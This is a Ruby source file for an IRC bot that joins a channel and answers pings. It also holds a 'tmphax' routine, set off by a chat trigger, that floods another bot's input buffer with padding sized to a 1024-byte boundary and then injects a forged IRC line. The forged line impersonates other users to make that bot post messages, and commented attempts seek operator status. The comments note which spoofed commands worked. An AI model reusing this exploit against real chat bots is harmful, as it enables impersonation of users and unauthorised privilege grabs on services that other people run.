require 'irc_message'

class GraysonBot
  def initialize(socket)
    @socket = socket
  end

  def run
    @socket.connect
    send 'NICK', 'GraysonBot'
    send 'USER', 'GraysonBot', 'GraysonBot', 'GraysonBot', 'DavidEGrayson\'s bot'
    send 'JOIN', '#poundpub'

    while true
      line = @socket.readline("\r\n")
      puts "received: " + line.inspect
      handle_line line
    end
  end

  def handle_line(line)
    msg = IrcMessage.decode(line)
    handle_message msg
  end

  def handle_message(msg)
    case msg.command
    when 'PING'
      if msg.params.empty?
        # that's weird
      elsif msg.params.size > 1
        # forwarding a PING to another server is not implemented
      else
        send 'PONG', msg.params.first
      end
    when 'PRIVMSG'
      if msg.params.size != 2
        # that's odd
        return
      end

      if md = msg.params[1].match(/%cve2(.*)/)
        tmphax(md[1])
      end

      if msg.params[1].include?("cleverbot")
        #puts "==== Sending the awesome sauce"
        #sleep 0.1
        #send 'PRIVMSG', 'Gr3yBot', 'bgm 3 bgm bgm 3 bgm bgm 3 bgm'
      end
    end
  end

  def send(command, *params)
    message = IrcMessage.new(command, *params)
    @socket.print message
  end

  def tmphax(arg_str)
    padding_fudge = arg_str.to_i
    puts "==== tmphax padding_fudge: #{padding_fudge}"

    # send 'PRIVMSG', 'NickServ', 'STATUS bgm'

    # Typical message from GraysonBot to Gr3yBot:
    # ":GraysonBot!GraysonBot@12345678 PRIVMSG Gr3yBot :contents\r\n"
    # Length = 51 + contents
    header_size = 49
    footer_size = 2
    overhead_size = header_size + footer_size

    target = 'Gr3yBot'

    # Ask for help so the bot stops reading its input buffer for a while.
    send 'PRIVMSG', target, "%help"

    sleep 1

    # Send 920 bytes to the bot's input buffer.
    # Each message should be 240 bytes when it gets to the bot.
    4.times do
      send 'PRIVMSG', target, 'a' * (230 - overhead_size)
    end

    # Send the payload.
    padding_size = 1024 - 920 - header_size + padding_fudge

    # command = ':bgm!bgm@bcc4f687 PRIVMSG #pub :%op DavidEGrayson'  # doesn't quite work
    # command = ':GraysonHome!GraysonHome@bcc4f687 PRIVMSG Gr3yBot :%help'  # worked
    # command = ':GraysonHome!GraysonHome@bcc4f687 PRIVMSG #pub :%define test'  # worked
    # command = ':McNutnut!McNutnut@bcc4f687 PRIVMSG Gr3yBot :%define hacked'
    command = ':McNutnut!McNutnut@bcc4f687 PRIVMSG #pub :%tell bgm much hax, so wow, omg wtf bbq bgm abc'  # worked

    send 'PRIVMSG', target, (':' * (padding_size)) + command
  end
end
